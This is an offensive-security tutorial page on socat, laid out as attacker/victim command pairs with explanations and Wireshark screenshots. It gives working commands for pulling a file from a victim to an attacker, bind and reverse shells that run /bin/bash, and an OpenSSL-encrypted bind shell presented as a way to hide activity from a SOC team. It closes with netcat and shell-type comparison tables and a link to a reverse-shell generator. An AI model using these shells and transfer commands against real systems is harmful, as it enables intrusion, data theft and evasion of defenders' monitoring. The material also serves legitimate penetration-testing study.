---
description: The abbreviation of the tool name is Socket Cat
cover: ../../../.gitbook/assets/SOCAT.jpg
coverY: 0
---

# Socat

### SOCAT

<figure><img src="../../../.gitbook/assets/image (220).png" alt=""><figcaption><p>Socat</p></figcaption></figure>

* Connection To a TCP/UDP Port

**Attacker** Machine&#x20;

{% code overflow="wrap" fullWidth="false" %}
```bash
socat - TCP4:<IP>:<PORT>
```
{% endcode %}

&#x20;**`-`** Stdin

<figure><img src="../../../.gitbook/assets/image (222).png" alt=""><figcaption></figcaption></figure>

* Listening To a TCP/UDP Port

**Victim** Machine &#x20;

```bash
socat TCP4-LISTEN:<PORT> stdout
```

<figure><img src="../../../.gitbook/assets/image (221).png" alt=""><figcaption></figcaption></figure>

* Transfer File With Socat

**Attacker** Machine&#x20;

```bash
socat  TCP4:<IP>:<PORT> file:sec.txt,create
```

* **`socat`**: This is the command itself, which stands for "SOcket CAT". It is a multipurpose relay tool that can create two bidirectional byte streams and transfer data between them.
* **`TCP4`**: This specifies the address type and protocol to be used. `TCP4` indicates that the connection will use the IPv4 protocol with TCP.
* **<`IP`>**: This is a placeholder for the IP address of the remote host to which you want to connect.
* **<`PORT`>**: This is a placeholder for the port number on the remote host to which you want to connect.
* **`file.tx`t**: This specifies the second address as a file. The data received from the TCP connection will be written to (or read from) this file. Here, `sec.txt` is the filename.
* **`create`**: This option ensures that the file `sec.txt` is created if it does not already exist. Without this option, if the file does not exist, the command would fail.

<figure><img src="../../../.gitbook/assets/image (224).png" alt=""><figcaption></figcaption></figure>

**Victim** Machine &#x20;

```bash
socat TCP4-LISTEN:<PORT>,fork file:sec.txt 

```

* `socat`: This is the command itself, which stands for "SOcket CAT". It is a utility for data transfer between two bidirectional data streams.
* `TCP4-LISTEN:<PORT>`: This specifies that `socat` should listen for incoming TCP connections on the specified port (replace `<PORT>` with the actual port number you want to use).
* `fork`: This option tells `socat` to fork (_**create a new process**_) for each incoming connection. This allows `socat` to handle multiple connections simultaneously.
* `file:sec.txt`: This specifies that the data received from each connection should be written to the file `sec.txt`.

<figure><img src="../../../.gitbook/assets/image (223).png" alt=""><figcaption></figcaption></figure>

> **The advantage of `Socat` is that it allows more than one person to connect to the same port at the same time, and the connection is not separated, which is what distinguishes it from `NC`.**

{% hint style="info" %}
U Cant Use Standard Input | Output And Redirect&#x20;
{% endhint %}

#### Victim Machine

```
socat tcp-listen:4444,fork - < sec.txt

```

<figure><img src="../../../.gitbook/assets/image (245).png" alt=""><figcaption><p>From WSL Ubuntu , Connected In Termux</p></figcaption></figure>

<mark style="color:red;">`-`</mark> -> Using Standard Input , After This , Waiting for Input&#x20;

<mark style="color:red;">`<`</mark> -> Using Redirect Character , Send Content File

#### Attacker Machine&#x20;

```
 socat tcp4:192.168.43.1:4444 - > sec.txt
```

<figure><img src="../../../.gitbook/assets/image (246).png" alt=""><figcaption></figcaption></figure>

<mark style="color:red;">`-`</mark>    -> Using Standard Input , After This , Waiting for Input

<mark style="color:red;">`>`</mark>    -> Using Redirect Character , Store In File  (Override)\
<mark style="color:red;">`>>`</mark> -> If U Want Adding Content In File With Old Value&#x20;

<figure><img src="../../../.gitbook/assets/image (247).png" alt=""><figcaption><p>Fingerprint</p></figcaption></figure>

* Socat Bind

<figure><img src="../../../.gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure>

**Attacker** Machine &#x20;

```bash
socat  -d -d -d - TCP4:<IP>:<PORT>
```

<figure><img src="../../../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>

**Victim** Machine &#x20;



```bash
socat -d -d -d tcp4-listen:<PORT<,fork exec:/bin/bash
```

<figure><img src="../../../.gitbook/assets/image (228).png" alt=""><figcaption></figcaption></figure>

* `socat`: The command-line utility for bidirectional data transfer between two independent data channels.
* `-d -d -d`: These flags enable different levels of debugging output. Each `-d` increases the verbosity of the debug information.
* `tcp4-listen:<PORT>`: This option tells `socat` to listen for incoming TCP connections on the specified port (`<PORT>`). The `tcp4` part specifies that only IPv4 connections are accepted.
* `fork`: This option tells `socat` to fork a new process for each incoming connection. This allows multiple clients to connect simultaneously, each handled by its own process.
* `exec:/bin/bash`: This part of the command specifies that when a connection is established, `socat` should execute `/bin/bash`. This effectively provides a shell to the connected client.

#### Socat Reverse Shells



**Attacker** Machine &#x20;

```bash
socat -d -d -v tcp4-listen:<PORT> stdout
```

<figure><img src="../../../.gitbook/assets/image (230).png" alt=""><figcaption></figcaption></figure>

**Victim** Machine &#x20;

```bash
socat  -d -d TCP4:<IP>:<PORT>,fork  exec:/bin/bash

```

<figure><img src="../../../.gitbook/assets/image (229).png" alt=""><figcaption></figcaption></figure>

### Socat Encrypted Bund Shell&#x20;

<figure><img src="../../../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
In normal use of the tool, if there is someone monitoring the communications that occur, if there is a SOC team monitoring everything that happens. It will see exactly what you are doing in terms of commands on the server or to victims inside the network and other things, so you may be easily detected and even know exactly what you were doing.
{% endhint %}

**Let's see this ,** Using Wireshark :

```
ip.addr == 192.168.43.1 && tcp
```

<figure><img src="../../../.gitbook/assets/image (248).png" alt=""><figcaption></figcaption></figure>

**Here I use a filter to filter the TCP packets because you will find a lot of connections using more than one different protocol, and this is a normal thing within the network.**

**--**

<figure><img src="../../../.gitbook/assets/image (249).png" alt=""><figcaption></figcaption></figure>

_**As you can see, as soon as he typed the ls command, the packet and connections started to appear**_

_**--**_

<figure><img src="../../../.gitbook/assets/image (250).png" alt=""><figcaption><p>Right Click > Follow > TCP Stream<br>Or<br>Ctrl + Alt + Shift + T</p></figcaption></figure>

{% hint style="info" %}
If you notice some strange letters, this is because those strange letters have a relationship to the colors that appear in the terminal. Some of them have a relationship to the formats inside the terminal, such as dropping a new line to display the rest of the files, such as the color of the file name and the color of the folders.
{% endhint %}

As you can see, this is a behavior that is very clear to anyone monitoring what is happening on the network

\--

**To hide this, we will encrypt the packet and all communications that occur between us and the other device ,** Using an encryption key we will create

* Generate key.pem&#x20;

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365

```

<figure><img src="../../../.gitbook/assets/image (233).png" alt=""><figcaption><p>PEM</p></figcaption></figure>

<mark style="color:red;">`req`</mark> ⇒ Indicates that we want to use OpenSSL in **requests** mode, which is used to create or process requests for SSL certificates.

<mark style="color:red;">`-x509`</mark> ⇒ Indicates that we want to create an X.509 certificate, which is a common format for digital certificates.

<mark style="color:red;">`-newkey rsa:4096`</mark> ⇒ OpenSSL says it should generate a new RSA key pair with a length of 4096 bits. The private and public key are generated in this step

<mark style="color:red;">`-keyout`</mark> ⇒ Specifies the name of the file in which the private key will be saved. In this case, the private key will be saved in a file called key.pem

<mark style="color:red;">`-out`</mark> ⇒ Specifies the name of the file in which the public certificate will be saved. In this case, the public certificate will be saved in a file called cert.pem.

<mark style="color:red;">`-days`</mark> ⇒ It determines the validity period of the certificate after its issuance, and here it is set to be valid for one year (365 days).

\--

Attacker

```bash
socat - openssl:<IP>:<PORT>,verify=0
```

<figure><img src="../../../.gitbook/assets/image (234).png" alt=""><figcaption></figcaption></figure>



Victim&#x20;

```bash
socat -d -d -v openssl-listen:6666,cert=bind.pem,fork,verify=0 exec:/bin/bash
```

<figure><img src="../../../.gitbook/assets/image (235).png" alt=""><figcaption></figcaption></figure>

### Wireshark

> Data is Encrypted Using openssl

<figure><img src="../../../.gitbook/assets/image (236).png" alt=""><figcaption></figcaption></figure>

### Socat VS Netcat

#### Summary Table

| Feature             | Netcat (nc)            | Socat                                  |
| ------------------- | ---------------------- | -------------------------------------- |
| Protocol Support    | TCP, UDP               | TCP, UDP, SCTP, UNIX sockets, and more |
| Ease of Use         | Simple, easy to use    | More complex, steeper learning curve   |
| Functionality       | Basic networking tasks | Advanced networking capabilities       |
| Port Scanning       | Yes                    | No                                     |
| Data Transformation | No                     | Yes                                    |
| Proxying/Relaying   | Basic                  | Advanced                               |
| Debugging           | Basic                  | Detailed                               |
| File Transfer       | Yes                    | Yes                                    |

#### Conclusion

* **Use `netcat`** for simpler, quick networking tasks such as port scanning, basic data transfer, and simple shell setups.
* **Use `socat`** when you need advanced capabilities such as data transformation, complex proxying, and handling multiple types of sockets and protocols.

Choose the tool based on the complexity of the task and the level of control you need over the network connections and data streams.

### Reverse shell VS Bind&#x20;



<figure><img src="../../../.gitbook/assets/image (231).png" alt=""><figcaption></figcaption></figure>

#### Summary Table

| Feature                  | Reverse Shell                         | Bind Shell                                  |
| ------------------------ | ------------------------------------- | ------------------------------------------- |
| **Connection Initiator** | Target                                | Attacker                                    |
| **Firewall/NAT Evasion** | Easier                                | Harder                                      |
| **Setup Complexity**     | More complex on target side           | Simpler on target side                      |
| **Detection Risk**       | Moderate (outbound connection)        | Higher (listening port)                     |
| **Use Case**             | When outbound connections are allowed | When the attacker can’t receive connections |

>
>
> #### Conclusion
>
> * **Reverse Shell** is generally more flexible in bypassing network restrictions.
> * **Bind Shell** can be simpler but is more likely to be blocked by network defenses.
> * Choose the method based on the network environment and specific constraints you are working with. Always ensure you have authorization and understand the legal implications of using these techniques.
> * [**Online Reverse Shell**](https://www.revshells.com/)



